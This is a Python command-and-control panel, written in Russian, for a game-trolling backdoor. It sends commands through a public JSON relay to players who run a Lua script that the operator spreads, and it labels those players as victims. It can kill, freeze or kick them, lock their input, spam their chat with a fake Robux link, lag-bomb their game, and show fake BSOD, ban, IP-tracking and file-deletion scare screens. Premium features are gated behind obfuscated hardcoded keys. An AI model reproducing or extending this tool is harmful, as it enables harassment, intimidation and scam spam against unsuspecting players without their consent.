# ═══════════════════════════════════════════════════
#  TrollMaster PRO v4.0 | Pydroid 3
#  Auto-refresh + VIP + ADMIN
# ═══════════════════════════════════════════════════
import requests, json, time, os, sys, random, hashlib, threading

URL = "https://api.npoint.io/d5decbe9a46d769f5419"

# ═══ ANSI ═══
G="\033[92m";R="\033[91m";Y="\033[93m";C="\033[96m"
M="\033[95m";W="\033[97m";D="\033[90m";E="\033[0m"
B="\033[1m";U="\033[4m"

# ═══ КЛЮЧИ (обфусцированные) ═══
_vk=[0x58,0x33,0x6b,0x39,0x23,0x54,0x4d,0x70,0x72,0x30,0x4c,0x6c,0x21,0x5a,0x38,0x77]
_ak=[99,70,79,19,76,125,122,27,80,118,3,114,80,77]
_VIP_KEY="".join([chr(c^0x11) for c in _vk])
_ADM_KEY="".join([chr(c^0x22) for c in _ak])
_VIP_HASH=hashlib.sha256(_VIP_KEY.encode()).hexdigest()
_ADM_HASH=hashlib.sha256(_ADM_KEY.encode()).hexdigest()

VIP=False; ADMIN=False

# ═══ ДАННЫЕ (потокобезопасные) ═══
_lock = threading.Lock()
_users = []
_online = False

SOUNDS={
    "1":("🔊 Loud Bass","9114005388"),     "2":("💥 Vine Boom","6229968865"),
    "3":("👻 Jumpscare","12222216"),        "4":("💻 Win Error","160715357"),
    "5":("💨 Fart","8799788385"),           "6":("😐 Bruh","5922089741"),
    "7":("🌙 Scary","9114214795"),          "8":("📯 MLG Horn","1846895498"),
    "9":("🎺 Sad Trombone","143996823"),    "10":("⚠️ Siren","1585349108"),
    "11":("🐔 Chicken","278722060"),        "12":("🎵 Nyan Cat","265913095"),
    "13":("🤡 Circus","188794535"),         "14":("💀 Oof","12222216"),
    "15":("🔔 Door Bell","138090596"),      "16":("🎸 Guitar Riff","145487017"),
}

SPAM_PRESETS={
    "1":"I GOT HACKED 😱","2":"IM A NOOB HELP ME",
    "3":"FREE ROBUX → bit.ly/fake","4":"I LOVE YOU ALL ❤️",
    "5":"HELP IM STUCK","6":"SUBSCRIBE TO MY CHANNEL",
    "7":"IM LEAVING FOREVER","8":"WHO WANTS TO BE MY FRIEND",
}

# ═══════════════════════════════════
# HTTP + AUTO-REFRESH
# ═══════════════════════════════════
def _get():
    try:
        r=requests.get(URL,timeout=8);return r.json() if r.status_code==200 else {}
    except: return {}

def _set(data):
    try:
        requests.post(URL,json=data,headers={"Content-Type":"application/json"},timeout=8);return True
    except: return False

def _refresh_loop():
    """Фоновый поток — обновляет юзеров каждые 2 сек"""
    global _users, _online
    while True:
        try:
            data=_get()
            now=int(time.time())
            with _lock:
                _users=[u for u in data.get("users",[]) if now-u.get("ts",0)<60]
                _online=True
        except:
            with _lock: _online=False
        time.sleep(2)

def get_users():
    with _lock: return list(_users)

def send(name,action,params=None,vip=False,adm=False):
    data=_get()
    cmd={"action":action,"params":params or {},"ts":int(time.time())}
    if vip: cmd["vip_auth"]=_VIP_HASH
    if adm: cmd["adm_auth"]=_ADM_HASH
    data["cmd_"+name]=cmd
    if _set(data):
        tag=f"{R}🔑 ADM" if adm else (f"{M}👑 VIP" if vip else f"{G}✅")
        print(f"  {tag} {action} → {name}{E}")
    else:
        print(f"  {R}❌ Ошибка!{E}")
    time.sleep(0.5)

# ═══════════════════════════════════
# UI ХЕЛПЕРЫ
# ═══════════════════════════════════
def clear(): os.system("clear" if os.name=="posix" else "cls")
def pause(): input(f"\n  {D}⏎ Enter...{E}")

def hdr(emoji,title,color=G):
    print(f"\n  {color}{B}╔{'═'*43}╗\n  ║  {emoji}  {title:^{37}} ║\n  ╚{'═'*43}╝{E}")

def opt(n,emoji,name,desc=""):
    ns=f"{n:>2}" if isinstance(n,int) else f"{n:>2}"
    d=f" {D}{desc}{E}" if desc else ""
    print(f"    {C}[{ns}]{E} {emoji} {W}{name}{E}{d}")

def sep(c=G): print(f"  {c}{'─'*45}{E}")

def banner():
    vb=f"  {M}👑 VIP{E}" if VIP else ""
    ab=f"  {R}🔑 ADMIN{E}" if ADMIN else ""
    print(f"""{R}{B}
    ╔══════════════════════════════════════╗
    ║  💀 ████████╗██████╗  ██████╗ ██╗   ║
    ║     ╚══██╔══╝██╔══██╗██╔═══██╗██║   ║
    ║        ██║   ██████╔╝██║   ██║██║   ║
    ║        ██║   ██╔══██╗██║   ██║██║   ║
    ║        ██║   ██║  ██║╚██████╔╝██████║
    ║        ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═════║
    ║     {M}M A S T E R   P R O   v4.0{R}      ║
    ╚══════════════════════════════════════╝{E}
{vb}{ab}""")

# ═══════════════════════════════════
# АКТИВАЦИЯ КЛЮЧЕЙ
# ═══════════════════════════════════
def activate_key():
    global VIP, ADMIN
    clear()
    hdr("🔑","АКТИВАЦИЯ КЛЮЧА",M)
    print(f"""
  {W}Доступные уровни:{E}
    {M}👑 VIP{E}   — жёсткие функции (экран, кик, лаг)
    {R}🔑 ADMIN{E} — серьёзные функции (IP, HWID, полный контроль)
    """)
    key=input(f"  {M}🔑 Ключ:{E} ").strip()
    h=hashlib.sha256(key.encode()).hexdigest()

    if h==_VIP_HASH:
        VIP=True
        data=_get(); data["vip_hash"]=_VIP_HASH; _set(data)
        clear()
        print(f"""
  {M}{B}╔═════════════════════════════════════╗
  ║      👑 VIP АКТИВИРОВАН 👑          ║
  ╠═════════════════════════════════════╣
  ║  🖥️  Чёрный экран                   ║
  ║  📺  Фейк бан-скрин                 ║
  ║  ⚠️   Текст на весь экран            ║
  ║  💀  Jumpscare                       ║
  ║  🌊  Матрица                         ║
  ║  🔴  Кровавый экран                  ║
  ║  🚫  НАСТОЯЩИЙ кик из игры           ║
  ║  🔒  Блокировка управления           ║
  ║  🧬  Удаление частей тела            ║
  ║  💣  Лаг-бомба                       ║
  ║  📢  Мега-спам (100 сообщений)       ║
  ║  🔊  Звуковая бомба                  ║
  ║  🎭  Фейк BSOD                      ║
  ║  ⏰  Таймер угрозы                    ║
  ║  📵  Заморозить экран                ║
  ║  🎪  Цирк                           ║
  ╚═════════════════════════════════════╝{E}""")

    elif h==_ADM_HASH:
        ADMIN=True; VIP=True
        data=_get(); data["vip_hash"]=_VIP_HASH; data["adm_hash"]=_ADM_HASH; _set(data)
        clear()
        print(f"""
  {R}{B}╔═════════════════════════════════════╗
  ║    🔑 ADMIN АКТИВИРОВАН 🔑          ║
  ║    + VIP разблокирован автоматом     ║
  ╠═════════════════════════════════════╣
  ║                                      ║
  ║  👁️  IP Tracker — показать "IP"       ║
  ║  🔐  HWID Ban — фейк аппаратный бан ║
  ║  📡  Data Harvest — сбор "данных"    ║
  ║  🖥️  System Takeover — захват экрана ║
  ║  💣  Self Destruct — удаление "файлов║
  ║                                      ║
  ║  {Y}⚠️  ВСЕ VIP ФУНКЦИИ ВКЛЮЧЕНЫ{R}       ║
  ╚═════════════════════════════════════╝{E}""")
    else:
        print(f"\n  {R}❌ Неверный ключ!{E}")
    pause()

# ═══════════════════════════════════
# ГЛАВНОЕ МЕНЮ
# ═══════════════════════════════════
def main_menu():
    target=None
    while True:
        clear(); banner()
        users=get_users()

        # Юзеры
        hdr("📡","ЖЕРТВЫ • авто-обновление 2с",C)
        print()
        if users:
            for i,u in enumerate(users,1):
                nm=u.get("name","???"); hp=u.get("hp","?"); gid=u.get("game","?")
                ago=int(time.time())-u.get("ts",0)
                st=f"{G}● LIVE{E}" if ago<10 else (f"{Y}● {ago}s{E}" if ago<30 else f"{R}● AFK{E}")
                mk=f" {Y}◄── ЦЕЛЬ{E}" if nm==target else ""
                ic="🎯" if nm==target else "👤"
                print(f"    {ic} {C}{i}.{E} {B}{W}{nm}{E}  {st}")
                print(f"       {D}❤️ {hp}HP  🎮 {gid}{E}{mk}")
        else:
            print(f"    {D}😴 Нет юзеров. Раздай Lua скрипт!{E}")
        print()
        sep(C)
        if target: print(f"  🎯 Цель: {Y}{B}{target}{E}")
        print()

        opt(1,"🔄","Обновить")
        opt(2,"🎯","Выбрать жертву")
        if target:
            print()
            opt(3,"💀","Убийства")
            opt(4,"🕹️","Контроль")
            opt(5,"⚡","Модификации")
            opt(6,"👁️","Визуал")
            opt(7,"🔊","Звуки")
            opt(8,"💬","Чат")
            opt(9,"🎪","Комбо")
            opt(10,"🌀","Телепорт")
            if VIP:
                print()
                print(f"    {M}[11]{E} 👑 {M}{B}VIP ФУНКЦИИ{E}")
            else:
                print(f"\n    {D}[11] 🔒 VIP (заблокировано){E}")
            if ADMIN:
                print(f"    {R}[12]{E} 🔑 {R}{B}ADMIN ФУНКЦИИ{E}")
            else:
                print(f"    {D}[12] 🔒 ADMIN (заблокировано){E}")
        print()
        opt(88,"🔑","Активировать ключ")
        opt(0,"🚪","Выход")
        print()

        ch=input(f"  {G}❯{E} ").strip()
        if ch=="0": clear();print(f"\n  {G}👋 Bye!{E}\n");os._exit(0)
        elif ch=="1": print(f"  {C}🔄...{E}");time.sleep(0.3)
        elif ch=="2": target=pick_user(users) or target
        elif ch=="3" and target: menu_kill(target)
        elif ch=="4" and target: menu_ctrl(target)
        elif ch=="5" and target: menu_mod(target)
        elif ch=="6" and target: menu_vis(target)
        elif ch=="7" and target: menu_snd(target)
        elif ch=="8" and target: menu_chat(target)
        elif ch=="9" and target: menu_combo(target)
        elif ch=="10" and target: menu_tp(target)
        elif ch=="11" and target:
            if VIP: menu_vip(target)
            else: print(f"  {R}🔒 Активируй VIP!{E}");pause()
        elif ch=="12" and target:
            if ADMIN: menu_admin(target)
            else: print(f"  {R}🔒 Активируй ADMIN!{E}");pause()
        elif ch=="88": activate_key()

def pick_user(users):
    if not users: print(f"  {R}❌ Нет{E}");time.sleep(1);return None
    print()
    for i,u in enumerate(users,1): print(f"    {C}{i}.{E} 👤 {u.get('name','???')}")
    try:
        idx=int(input(f"\n  {Y}#:{E} ").strip())
        if 1<=idx<=len(users):
            t=users[idx-1].get("name");print(f"  {G}🎯 {t}{E}");time.sleep(0.5);return t
    except:pass
    return None

# ═══════════════════ 💀 УБИЙСТВА ═══════════════════
def menu_kill(t):
    while True:
        clear();hdr("💀","УБИЙСТВА",R);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"💀","Kill","HP=0"); opt(2,"🚀","Fling","В космос")
        opt(3,"☁️","TP Sky","+500"); opt(4,"🕳️","TP Void","Бездна")
        opt(5,"💣","Explode","Взрыв"); opt(6,"🌪️","Tornado","Крутит+fling")
        opt(7,"⚡","Lightning","Молния+kill"); opt(8,"🔄","Death Loop","Бесконечно")
        opt(9,"🛑","Стоп Loop",""); print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {R}❯{E} ").strip()
        if ch=="0":return
        m={"1":"kill","2":"fling","3":"tpsky","4":"tpvoid","5":"explode","6":"tornadofling","7":"lightning","8":"deathloop","9":"stopdeathloop"}
        if ch in m: send(t,m[ch])
        if ch!="0":pause()

# ═══════════════════ 🕹️ КОНТРОЛЬ ═══════════════════
def menu_ctrl(t):
    while True:
        clear();hdr("🕹️","КОНТРОЛЬ",Y);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"🧊","Freeze"); opt(2,"🪑","Sit"); opt(3,"⬆️","Jump")
        opt(4,"🌀","Spin"); opt(5,"🔀","Invert"); opt(6,"🤸","Ragdoll")
        opt(7,"🏃","Force Walk"); opt(8,"💃","Dance"); opt(9,"🐛","Seizure Walk")
        opt(10,"🧲","Magnet"); opt(11,"🤖","Bot Walk"); opt(12,"🔒","Lock Cam")
        opt(13,"🪂","Skydive","TP Sky + задержка + fling")
        opt(14,"🔄","Spin Fast","Быстрое вращение")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {Y}❯{E} ").strip()
        if ch=="0":return
        m={"1":"freeze","2":"sit","3":"jump","4":"spin","5":"invert","6":"ragdoll","7":"forcewalk","8":"dance","9":"seizurewalk","10":"magnet","11":"botwalk","12":"lockcam","13":"skydive","14":"fastspin"}
        if ch in m: send(t,m[ch])
        if ch!="0":pause()

# ═══════════════════ ⚡ МОДИФИКАЦИИ ═══════════════════
def menu_mod(t):
    while True:
        clear();hdr("⚡","МОДИФИКАЦИИ",C);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"🏎️","Speed"); opt(2,"🦘","JumpPower"); opt(3,"🦍","Giant"); opt(4,"🐜","Tiny")
        opt(5,"🫥","Invisible"); opt(6,"👻","Noclip"); opt(7,"🕊️","Fly"); opt(8,"🦿","Gravity")
        opt(9,"🔥","Fire"); opt(10,"✨","Sparkles"); opt(11,"💨","Smoke"); opt(12,"🫧","Bubbles")
        opt(13,"💡","Flashlight"); opt(14,"🌈","Trail"); opt(15,"🧊","Ice Body","Голубой прозрачный")
        opt(16,"🔄","Reset Stats",""); opt(17,"🧹","Remove FX","")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {C}❯{E} ").strip()
        if ch=="0":return
        elif ch=="1":
            s=input(f"  {Y}⚡ Speed:{E} ").strip(); send(t,"speed",{"speed":int(s) if s.isdigit() else 200})
        elif ch=="2":
            p=input(f"  {Y}🦘 Power:{E} ").strip(); send(t,"jumppower",{"power":int(p) if p.isdigit() else 200})
        elif ch=="3":
            s=input(f"  {Y}🦍 Scale:{E} ").strip(); send(t,"giant",{"scale":float(s) if s.replace('.','').isdigit() else 5})
        elif ch=="4": send(t,"giant",{"scale":0.2})
        elif ch=="5": send(t,"invisible")
        elif ch=="6": send(t,"noclip")
        elif ch=="7": send(t,"fly")
        elif ch=="8":
            g=input(f"  {Y}🦿 Gravity:{E} ").strip(); send(t,"gravity",{"gravity":int(g) if g.isdigit() else 30})
        elif ch=="9": send(t,"fire")
        elif ch=="10": send(t,"sparkles")
        elif ch=="11": send(t,"smoke")
        elif ch=="12": send(t,"bubbles")
        elif ch=="13": send(t,"flashlight")
        elif ch=="14": send(t,"trail")
        elif ch=="15": send(t,"icebody")
        elif ch=="16": send(t,"speedreset")
        elif ch=="17": send(t,"removeeffects")
        if ch!="0":pause()

# ═══════════════════ 👁️ ВИЗУАЛ ═══════════════════
def menu_vis(t):
    while True:
        clear();hdr("👁️","ВИЗУАЛ",M);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"🫨","Seizure"); opt(2,"🌫️","Blur"); opt(3,"📐","FOV")
        opt(4,"⬛","Blackout"); opt(5,"🔴","Red Screen"); opt(6,"🌈","Rainbow")
        opt(7,"🔄","Drunk"); opt(8,"🔭","Zoom"); opt(9,"🔃","Flip Cam")
        opt(10,"🌫️","Fog"); opt(11,"⬛","Remove Sky"); opt(12,"🌑","Night")
        opt(13,"☀️","Day"); opt(14,"🎥","Shake Cam"); opt(15,"🧹","Clear FX")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {M}❯{E} ").strip()
        if ch=="0":return
        elif ch=="3":
            f=input(f"  {Y}FOV:{E} ").strip(); send(t,"fov",{"fov":int(f) if f.isdigit() else 120})
        else:
            m={"1":"seizure","2":"blur","4":"blackout","5":"redscreen","6":"rainbow","7":"drunk","8":"zoom","9":"flipcam","10":"fog","11":"removesky","12":"night","13":"day","14":"shakecam","15":"clearfx"}
            if ch in m: send(t,m[ch])
        if ch!="0":pause()

# ═══════════════════ 🔊 ЗВУКИ ═══════════════════
def menu_snd(t):
    while True:
        clear();hdr("🔊","ЗВУКИ",M);print(f"  {D}Цель: {Y}{t}{E}\n")
        for k,(nm,_) in SOUNDS.items(): print(f"    {M}[{k:>2}]{E} {W}{nm}{E}")
        print()
        opt("c","🎵","Свой ID"); opt("l","🔁","Loop"); opt("s","🔇","Стоп")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {M}❯{E} ").strip()
        if ch=="0":return
        elif ch=="s": send(t,"stopsound")
        elif ch=="c":
            sid=input(f"  {Y}ID:{E} ").strip(); vol=input(f"  {Y}Vol:{E} ").strip()
            send(t,"sound",{"id":sid,"volume":float(vol) if vol else 5})
        elif ch=="l":
            sid=input(f"  {Y}ID:{E} ").strip(); cnt=input(f"  {Y}x:{E} ").strip()
            send(t,"loopsound",{"id":sid,"count":int(cnt) if cnt.isdigit() else 5})
        elif ch in SOUNDS:
            send(t,"sound",{"id":SOUNDS[ch][1],"volume":5})
        if ch!="0":pause()

# ═══════════════════ 💬 ЧАТ ═══════════════════
def menu_chat(t):
    while True:
        clear();hdr("💬","ЧАТ",G);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"💬","Написать"); opt(2,"📢","Спам текст"); opt(3,"📋","Пресет")
        opt(4,"🔢","Цифры"); opt(5,"😱","HELP HACKED"); opt(6,"❤️","Love Spam")
        opt(7,"🤖","Bot Spam"); opt(8,"🔠","Key Spam")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {G}❯{E} ").strip()
        if ch=="0":return
        elif ch=="1":
            msg=input(f"  {Y}Текст:{E} ").strip(); send(t,"chat",{"message":msg or "hi"})
        elif ch=="2":
            msg=input(f"  {Y}Текст:{E} ").strip(); cnt=input(f"  {Y}Раз:{E} ").strip()
            send(t,"chatspam",{"message":msg or "...","count":int(cnt) if cnt.isdigit() else 10})
        elif ch=="3":
            for k,v in SPAM_PRESETS.items(): print(f"    {C}[{k}]{E} {v}")
            p=input(f"\n  {Y}#:{E} ").strip()
            if p in SPAM_PRESETS:
                cnt=input(f"  {Y}Раз:{E} ").strip()
                send(t,"chatspam",{"message":SPAM_PRESETS[p],"count":int(cnt) if cnt.isdigit() else 10})
        elif ch=="4":
            cnt=input(f"  {Y}До:{E} ").strip(); send(t,"chatnumbers",{"count":int(cnt) if cnt.isdigit() else 20})
        elif ch=="5": send(t,"chatspam",{"message":"HELP IM HACKED 😱","count":15})
        elif ch=="6":
            n=input(f"  {Y}Имя:{E} ").strip(); send(t,"chatspam",{"message":f"I LOVE {n} ❤️","count":15})
        elif ch=="7": send(t,"botspam",{"count":15})
        elif ch=="8": send(t,"keyspam",{"count":15})
        if ch!="0":pause()

# ═══════════════════ 🌀 ТЕЛЕПОРТ ═══════════════════
def menu_tp(t):
    while True:
        clear();hdr("🌀","ТЕЛЕПОРТ",C);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"📍","Coords"); opt(2,"☁️","Sky"); opt(3,"🕳️","Void"); opt(4,"🏔️","Mega Sky +5000")
        opt(5,"🔀","Random"); opt(6,"🌊","Edge"); opt(7,"📌","Spawn"); opt(8,"🎢","TP Loop"); opt(9,"🛑","Стоп")
        print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {C}❯{E} ").strip()
        if ch=="0":return
        elif ch=="1":
            def pf(s):
                try:return float(s)
                except:return 0
            x=input(f"  X: ").strip();y=input(f"  Y: ").strip();z=input(f"  Z: ").strip()
            send(t,"tp",{"x":pf(x),"y":pf(y) if y else 200,"z":pf(z)})
        else:
            m={"2":"tpsky","3":"tpvoid","4":"megasky","5":"randomtp","6":"edge","7":"tpspawn","8":"tploop","9":"stoptploop"}
            if ch in m: send(t,m[ch])
        if ch!="0":pause()

# ═══════════════════ 🎪 КОМБО ═══════════════════
def menu_combo(t):
    while True:
        clear();hdr("🎪","КОМБО",Y);print(f"  {D}Цель: {Y}{t}{E}\n")
        opt(1,"⚔️","Казнь","Freeze→Spin→Sound→Kill")
        opt(2,"🎉","Дискотека","Seizure+Bass+Spin+Rainbow")
        opt(3,"👽","Похищение","Sky→Freeze→Fog")
        opt(4,"🐜","Карлик-Хаос","Tiny+Speed500+Spin")
        opt(5,"👻","Призрак","Invis+Noclip+Fly")
        opt(6,"🌋","Тотальный Хаос","Fling+Sound+Spam+Fire")
        opt(7,"🤡","Клоун","Giant+Spin+Circus")
        opt(8,"😵","Мучение","Drunk+Seizure+Slow")
        opt(9,"🏃","Ракета","Speed1000+Jump500")
        opt(10,"💀","Nightmare","Blackout→Scare→Kill")
        opt(11,"🌀","Ад","Red+Fire+Void")
        opt(12,"🧊","Тюрьма","Freeze+Fog+Blur")
        print(); opt(99,"🧹","RESET ALL"); print(); opt(0,"◀️","Назад"); print()
        ch=input(f"  {Y}❯{E} ").strip()
        if ch=="0":return
        combos={
            "1":[("freeze",None,0.8),("spin",None,0.5),("sound",{"id":"9114005388","volume":8},1.5),("kill",None,0)],
            "2":[("seizure",None,0.3),("sound",{"id":"9114005388","volume":8},0.3),("spin",None,0.3),("rainbow",None,0)],
            "3":[("tpsky",None,0.8),("freeze",None,0.3),("fog",None,0)],
            "4":[("giant",{"scale":0.2},0.3),("speed",{"speed":500},0.3),("spin",None,0)],
            "5":[("invisible",None,0.3),("noclip",None,0.3),("fly",None,0)],
            "6":[("fling",None,0.8),("sound",{"id":"6229968865","volume":10},0.3),("chatspam",{"message":"HACKED 😱","count":10},0.3),("fire",None,0)],
            "7":[("giant",{"scale":8},0.3),("spin",None,0.3),("sound",{"id":"188794535","volume":6},0)],
            "8":[("drunk",None,0.3),("seizure",None,0.3),("speed",{"speed":5},0)],
            "9":[("speed",{"speed":1000},0.3),("jumppower",{"power":500},0)],
            "10":[("blackout",None,1),("sound",{"id":"12222216","volume":10},2),("kill",None,0)],
            "11":[("redscreen",None,0.5),("fire",None,0.3),("tpvoid",None,0)],
            "12":[("freeze",None,0.3),("fog",None,0.3),("blur",None,0)],
        }
        if ch in combos:
            for act,prm,dl in combos[ch]: send(t,act,prm);time.sleep(dl)
        elif ch=="99": send(t,"reset")
        if ch!="0":pause()

# ═══════════════════ 👑 VIP ═══════════════════
def menu_vip(t):
    while True:
        clear()
        print(f"""
  {M}{B}╔═════════════════════════════════════════╗
  ║       👑  VIP ФУНКЦИИ  👑               ║
  ╚═════════════════════════════════════════╝{E}
  {D}Цель: {Y}{B}{t}{E}

    {R}{'─── ЭКРАН ───':^44}{E}""")
        opt(1,"🖥️","Чёрный экран","Навсегда")
        opt(2,"📺","Фейк бан","Своя причина")
        opt(3,"⚠️","Текст на экран","Своя надпись")
        opt(4,"💀","Jumpscare","Страшно+звук")
        opt(5,"🌊","Матрица","Matrix rain")
        opt(6,"🔴","Кровь","Красная пульсация")
        print(f"\n    {R}{'─── КОНТРОЛЬ ───':^44}{E}")
        opt(7,"🚫","НАСТОЯЩИЙ КИК","Реальный кик из игры!")
        opt(8,"🔒","Блок управления","Всё заблокировано")
        opt(9,"🔓","Разблок","")
        opt(10,"🔄","Death Loop","Бесконечная смерть")
        opt(11,"🧬","Удалить тело","Руки/ноги пропадают")
        opt(12,"📏","Сплющить","Блин")
        print(f"\n    {R}{'─── АТАКА ───':^44}{E}")
        opt(13,"💣","Лаг-бомба","300 объектов")
        opt(14,"📢","Мега-спам","100 сообщений")
        opt(15,"🔊","Звуковая бомба","8 звуков сразу")
        opt(16,"🌀","Хаос-машина","Всё сразу")
        opt(17,"🎭","Фейк BSOD","Синий экран")
        opt(18,"⏰","Таймер","Обратный отсчёт")
        opt(19,"📵","Freeze экран","10 сек заморозка")
        opt(20,"🎪","Цирк","Гигант+всё")
        print(f"\n    {M}[99]{E} 🧹 {W}RESET{E}")
        print(f"    {M}[ 0]{E} ◀️  {W}Назад{E}\n")

        ch=input(f"  {M}👑 ❯{E} ").strip()
        if ch=="0":return
        elif ch=="1": send(t,"vip_blackscreen",{},True)
        elif ch=="2":
            r=input(f"  {Y}Причина:{E} ").strip()
            send(t,"vip_banscreen",{"reason":r or "Cheating"},True)
        elif ch=="3":
            tx=input(f"  {Y}Текст:{E} ").strip()
            cl=input(f"  {Y}Цвет(red/green/blue/white/yellow):{E} ").strip()
            sz=input(f"  {Y}Размер(24-100):{E} ").strip()
            send(t,"vip_fulltext",{"text":tx or "TROLLED","color":cl or "red","size":int(sz) if sz.isdigit() else 50},True)
        elif ch=="4": send(t,"vip_jumpscare",{},True)
        elif ch=="5": send(t,"vip_matrix",{},True)
        elif ch=="6": send(t,"vip_bloodscreen",{},True)
        elif ch=="7":
            r=input(f"  {R}🚫 Причина кика:{E} ").strip()
            send(t,"vip_realkick",{"reason":r or "Kicked by admin"},True)
            print(f"  {R}💀 Игрок будет кикнут из игры!{E}")
        elif ch=="8": send(t,"vip_blockinput",{},True)
        elif ch=="9": send(t,"vip_unblockinput",{},True)
        elif ch=="10": send(t,"vip_deathloop",{},True)
        elif ch=="11": send(t,"vip_removeparts",{},True)
        elif ch=="12": send(t,"vip_flatten",{},True)
        elif ch=="13": send(t,"vip_lagbomb",{},True)
        elif ch=="14":
            msg=input(f"  {Y}Текст:{E} ").strip()
            send(t,"vip_megaspam",{"message":msg or "HACKED","count":100},True)
        elif ch=="15": send(t,"vip_soundbomb",{},True)
        elif ch=="16": send(t,"vip_chaosmachine",{},True)
        elif ch=="17":
            msg=input(f"  {Y}Ошибка:{E} ").strip()
            send(t,"vip_fakeerror",{"message":msg or "CRITICAL ERROR"},True)
        elif ch=="18":
            sc=input(f"  {Y}Секунд(5-60):{E} ").strip()
            msg=input(f"  {Y}Текст после:{E} ").strip()
            send(t,"vip_timer",{"seconds":int(sc) if sc.isdigit() else 10,"message":msg or "HACKED"},True)
        elif ch=="19": send(t,"vip_freezescreen",{},True)
        elif ch=="20": send(t,"vip_circus",{},True)
        elif ch=="99": send(t,"reset",{},True)
        if ch!="0":pause()

# ═══════════════════ 🔑 ADMIN ═══════════════════
def menu_admin(t):
    while True:
        clear()
        print(f"""
  {R}{B}╔═════════════════════════════════════════╗
  ║      🔑  ADMIN ФУНКЦИИ  🔑              ║
  ║      ⚠️  СЕРЬЁЗНЫЙ УРОВЕНЬ              ║
  ╚═════════════════════════════════════════╝{E}
  {D}Цель: {Y}{B}{t}{E}
        """)
        opt(1,"👁️","IP Tracker","Показать фейк IP на экране")
        opt(2,"🔐","HWID Ban","Фейк аппаратный бан")
        opt(3,"📡","Data Harvest","Анимация 'сбора данных'")
        opt(4,"🖥️","System Takeover","Захват экрана + попапы")
        opt(5,"💣","Self Destruct","Фейк удаление файлов")
        print()
        opt(99,"🧹","RESET")
        opt(0,"◀️","Назад")
        print()

        ch=input(f"  {R}🔑 ❯{E} ").strip()
        if ch=="0":return
        elif ch=="1":
            send(t,"adm_iptrack",{},True,True)
            print(f"  {R}👁️ IP трекер отправлен{E}")
        elif ch=="2":
            r=input(f"  {Y}Причина:{E} ").strip()
            send(t,"adm_hwidban",{"reason":r or "HWID flagged"},True,True)
        elif ch=="3":
            send(t,"adm_dataharvest",{},True,True)
        elif ch=="4":
            send(t,"adm_takeover",{},True,True)
        elif ch=="5":
            send(t,"adm_selfdestruct",{},True,True)
        elif ch=="99":
            send(t,"reset",{},True,True)
        if ch!="0":pause()

# ═══════════════════ ЗАПУСК ═══════════════════
if __name__=="__main__":
    clear()
    print(f"\n  {C}📡 Подключение...{E}\n  {D}{URL}{E}\n")

    # Запуск фонового потока авто-обновления
    t=threading.Thread(target=_refresh_loop,daemon=True)
    t.start()

    time.sleep(1)
    with _lock:
        ok=_online
    if True:  # всегда запускаем
        print(f"  {G}✅ Relay OK! Auto-refresh запущен.{E}")
        time.sleep(0.5)
        main_menu()
